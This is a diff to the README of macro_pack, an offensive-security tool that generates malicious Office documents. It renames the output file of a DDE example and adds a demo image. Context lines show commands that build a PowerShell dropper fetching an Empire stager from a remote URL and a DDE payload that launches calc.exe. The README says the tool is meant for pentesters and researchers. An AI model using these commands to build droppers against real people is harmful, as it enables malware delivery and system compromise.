@@ -63,6 +63,7 @@ Scripting (txt) supported formats are:
 Note that all scripting formats can be generated on Linux version of macro\_pack as well.
 
 
+
 ### Ethical use
 
 The macro\_pack tool shall only be used by pentester, security researchers, or other people with learning purpose. 
@@ -156,8 +157,11 @@ echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -
 
 - Execute calc.exe via Dynamic Data Exchange (DDE) attack
 ```bash
-echo calc.exe | macro_pack.exe --dde -G dde_test.docx
+echo calc.exe | macro_pack.exe --dde -G calc.xslx
 ```
+
+<p align="center"><img src="./assets/excel_dde.png" alt="Excel DDE demo"></p>
+
 
 - Download and execute file via powershell using Dynamic Data Exchange (DDE) attack
 ```bash
